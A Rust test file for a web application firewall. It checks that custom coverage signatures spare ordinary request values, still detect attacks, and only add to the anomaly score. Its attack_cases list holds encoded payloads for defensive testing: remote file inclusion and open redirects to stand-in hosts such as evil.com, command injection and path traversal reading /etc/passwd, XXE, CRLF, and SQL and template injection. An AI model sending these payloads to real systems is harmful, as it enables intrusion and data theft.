//! False-positive guard for `rules/custom/coverage.conf`.
//!
//! Why this file exists: the 16 coverage signatures (ids 99002xx) are loaded
//! for EVERY site that is not switched off (`control-plane` loads the file
//! unconditionally), and they originally carried a bare `block` action. A bare
//! `block` sets the decision inside the rule VM during phase 1, which returns
//! before `apply_verdict` — the only place the n-gram classifier can veto a
//! weak-evidence block. So these rules could hard-403 a request no matter what
//! every other engine thought, and several of their patterns matched ordinary
//! English words at the start of a parameter value (`fetch`, `idle`, `turn`,
//! `login`, `quit`, `data`), the word `confirm` inside any HTML tag, and
//! `new Date(` in any posted script.
//!
//! Nothing caught it: the benchmark corpus contains none of those words in
//! those positions, and the only live demo site runs in learning mode, where a
//! would-be block is recorded instead of served.
//!
//! The test asserts BOTH directions on purpose. Loosening a signature until the
//! benign half passes is only correct if the attack half still fires, so every
//! relaxation here is bounded by `coverage_rules_still_catch_their_attack_class`.

mod common;

use common::{make_get_ctx, make_post_ctx};
use sentinel_core::context::{Phase, RequestContext, WafDecision};
use sentinel_rules::RuleEngine;
use std::path::{Path, PathBuf};

fn custom_rules_path() -> PathBuf {
    // CARGO_MANIFEST_DIR = crates/sentinel-rules; workspace root is two up.
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/custom/coverage.conf")
}

/// Compile `rules/custom/coverage.conf` alone, so a failure here names the
/// coverage signatures rather than some CRS rule that happened to also match.
fn coverage_engine() -> RuleEngine {
    let path = custom_rules_path();
    let source = std::fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("failed to read {}: {}", path.display(), e));
    let file = sentinel_rules::import_secrule_conf_dir(&source, path.parent())
        .unwrap_or_else(|e| panic!("failed to import {}: {}", path.display(), e));
    let ruleset = sentinel_rules::compile(file)
        .unwrap_or_else(|e| panic!("failed to compile {}: {}", path.display(), e));
    RuleEngine::new(ruleset)
}

fn eval(engine: &RuleEngine, ctx: &mut RequestContext) {
    engine.evaluate(ctx, Phase::RequestHeaders, 0);
    engine.evaluate(ctx, Phase::RequestBody, 0);
}

/// Ordinary traffic that must never be touched by a coverage signature.
///
/// Each entry is (description, context). These are deliberately mundane: query
/// parameters an average application uses, and body text an average user types.
fn benign_cases() -> Vec<(&'static str, RequestContext)> {
    vec![
        // --- 9900216, protocol-relative URLs. A `//` only matters when it
        // --- starts the value AND is followed by something domain-shaped.
        (
            "sloppy path with a doubled slash in the middle",
            make_get_ctx("/img?path=%2Fassets%2F%2Flogo.png"),
        ),
        (
            "leading double slash but no host at all",
            make_get_ctx("/files?path=%2F%2Fuploads%2Freport"),
        ),
        (
            "a line of code that begins with a comment marker",
            make_get_ctx("/snippet?code=%2F%2F%20TODO%20fix%20this%20later"),
        ),
        (
            "base64 whose alphabet contains a doubled slash",
            make_get_ctx("/d?blob=SGVsbG8vL3dvcmxkIGZyb20gYmFzZTY0"),
        ),
        (
            "windows UNC share, no dotted host",
            make_get_ctx("/open?unc=%5C%5Cfileserver%5Cshare"),
        ),
        (
            "an ordinary absolute URL that carries its scheme",
            make_get_ctx("/go?next=https%3A%2F%2Fshop.example.com%2Fcart"),
        ),
        (
            "AJAX action parameter literally named fetch",
            make_get_ctx("/api/items?action=fetch"),
        ),
        (
            "status parameter with the value idle",
            make_get_ctx("/api/session?state=idle"),
        ),
        (
            "directions text beginning with the word turn",
            make_get_ctx("/maps?dir=turn%20left%20at%20the%20lights"),
        ),
        (
            "login and logout as ordinary action values",
            make_get_ctx("/account?action=login&next=logout"),
        ),
        (
            "a search box containing the word quit",
            make_get_ctx("/search?q=how%20to%20quit%20smoking"),
        ),
        (
            "an export endpoint whose mode is data",
            make_get_ctx("/export?mode=data&format=csv"),
        ),
        (
            "a relative image path in a parameter",
            make_get_ctx("/render?img=../assets/logo.png"),
        ),
        (
            "prose asking how to fetch from an API",
            make_get_ctx("/search?q=how%20to%20fetch%20data%20from%20an%20api"),
        ),
        (
            "an order confirmation message",
            make_get_ctx("/checkout?msg=Please%20confirm%20your%20order"),
        ),
        (
            "a posted comment containing a JavaScript date",
            make_post_ctx("/comments", "body=var%20t%20%3D%20new%20Date%28%29%3B"),
        ),
        (
            "a quoted email reply in a textarea",
            make_post_ctx(
                "/tickets",
                "body=From%3A%20Alice%0D%0AHi%2C%20any%20update%3F",
            ),
        ),
        (
            "a ticket reply whose second line begins with Subject",
            make_post_ctx(
                "/tickets",
                "text=Hi%0D%0ASubject%3A%20Re%3A%20order%20123%0D%0Athanks",
            ),
        ),
        (
            "a forwarded message quoting a From line",
            make_post_ctx("/tickets", "text=Regards%0D%0AFrom%3A%20Alice%20Chen"),
        ),
        (
            "an HTML snippet pasted into a CMS field",
            make_post_ctx(
                "/pages",
                "html=%3Cinput%20type%3D%22submit%22%20value%3D%22Confirm%20order%22%3E",
            ),
        ),
        (
            "a support note containing a contact header",
            make_post_ctx("/notes", "text=Contact%3A%20support%40example.com"),
        ),
        (
            "a namespace field on a settings form",
            make_get_ctx("/settings?namespace=production"),
        ),
        (
            "an append-mode upload parameter",
            make_get_ctx("/upload?mode=append&status=messages"),
        ),
    ]
}

/// The attack classes this file exists to cover. CRS 4.x scores near zero on
/// these, which is the whole reason the coverage signatures were written, so a
/// regression here costs real detection.
fn attack_cases() -> Vec<(&'static str, RequestContext)> {
    vec![
        // --- 9900216. Each of these returned 200 with NO rule firing before
        // --- this signature existed; the scheme-ful form was already a 403.
        (
            "protocol-relative open redirect",
            make_get_ctx("/go?next=%2F%2Fevil.com"),
        ),
        (
            "protocol-relative RFI with a payload path",
            make_get_ctx("/inc?file=%2F%2Fevil.com%2Fshell.php"),
        ),
        (
            "protocol-relative with a trailing slash",
            make_get_ctx("/go?next=%2F%2Fevil.com%2F"),
        ),
        (
            "backslash variant a browser normalises to //",
            make_get_ctx("/go?next=%5C%5Cattacker.tld%2Fa"),
        ),
        (
            "userinfo used to disguise the real host",
            make_get_ctx("/go?next=%2F%2Fgood.example.com%40evil.com%2F"),
        ),
        (
            "extra leading slashes",
            make_get_ctx("/go?next=%2F%2F%2Fevil.com%2Fx"),
        ),
        (
            "CRLF response splitting",
            make_get_ctx("/redir?url=http%3A%2F%2Fx%2F%0D%0ASet-Cookie%3A%20admin%3D1"),
        ),
        (
            "LDAP filter injection",
            make_get_ctx("/dir?user=%2A%29%28uid%3D%2A"),
        ),
        (
            "server-side template injection",
            make_get_ctx("/hello?name=%7B%7B7%2A7%7D%7D"),
        ),
        (
            "NoSQL operator injection",
            make_get_ctx("/login?user%5B%24ne%5D=1"),
        ),
        (
            "SMTP command injection",
            make_get_ctx("/mail?to=rcpt%20to%3A%20victim%40example.com"),
        ),
        (
            "OS command injection",
            make_get_ctx("/ping?host=%3Bcat%20%2Fetc%2Fpasswd"),
        ),
        (
            "path traversal to a sensitive file",
            make_get_ctx("/file?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ),
        (
            "XXE external entity in a posted body",
            make_post_ctx(
                "/soap",
                "%3C%21DOCTYPE%20foo%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E",
            ),
        ),
        (
            "SQL injection via a JSON function",
            make_get_ctx("/q?id=1%20AND%20JSON_EXTRACT%28a%2C%27%24%27%29"),
        ),
        (
            "time-based SQL injection",
            make_get_ctx("/q?id=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27"),
        ),
    ]
}

/// No coverage signature may block ordinary traffic on its own.
///
/// The decision assertion is the load-bearing one: a bare `block` action sets
/// it inside the VM before any other engine is consulted, which is what made
/// this class of bug unreachable by the false-positive suppression layer.
#[test]
fn coverage_rules_do_not_block_ordinary_traffic() {
    let engine = coverage_engine();
    let mut offenders = Vec::new();

    for (what, mut ctx) in benign_cases() {
        eval(&engine, &mut ctx);
        if ctx.decision == WafDecision::Block || !ctx.rule_matches.is_empty() {
            offenders.push(format!(
                "  {what}: decision={:?} score={} rules={:?}",
                ctx.decision,
                ctx.anomaly_score,
                ctx.rule_matches
                    .iter()
                    .map(|m| m.rule_id.as_str())
                    .collect::<Vec<_>>()
            ));
        }
    }

    assert!(
        offenders.is_empty(),
        "coverage signatures fired on ordinary traffic:\n{}",
        offenders.join("\n")
    );
}

/// The other half of the bound: every attack class the file claims to cover
/// must still be detected after any relaxation above.
#[test]
fn coverage_rules_still_catch_their_attack_class() {
    let engine = coverage_engine();
    let mut missed = Vec::new();

    for (what, mut ctx) in attack_cases() {
        eval(&engine, &mut ctx);
        if ctx.rule_matches.is_empty() {
            missed.push(format!("  {what}: not detected"));
        }
    }

    assert!(
        missed.is_empty(),
        "coverage signatures stopped detecting their own attack class:\n{}",
        missed.join("\n")
    );
}

/// A coverage signature must contribute score, never decide on its own.
///
/// This is the structural guard behind the two tests above. `block`/`deny` in
/// the rule VM short-circuits phase 1 and returns before `apply_verdict`, so a
/// single regex outranks the classifier, the per-site threshold and every other
/// engine. Scoring keeps the signature's detection value while leaving the
/// verdict where it belongs.
#[test]
fn coverage_rules_score_rather_than_decide() {
    let path = custom_rules_path();
    let source = std::fs::read_to_string(&path).expect("read coverage.conf");

    let offenders: Vec<&str> = source
        .lines()
        .map(str::trim)
        .filter(|l| {
            let l = l.trim_end_matches('\\').trim_end_matches(',').trim();
            l == "block" || l == "deny" || l == "drop"
        })
        .collect();

    assert!(
        offenders.is_empty(),
        "coverage.conf must not use a decisive action ({} found). Use \
         `pass` with `setvar:tx.anomaly_score=+N` so the verdict is made by \
         apply_verdict, where the false-positive suppression layer runs.",
        offenders.len()
    );
}
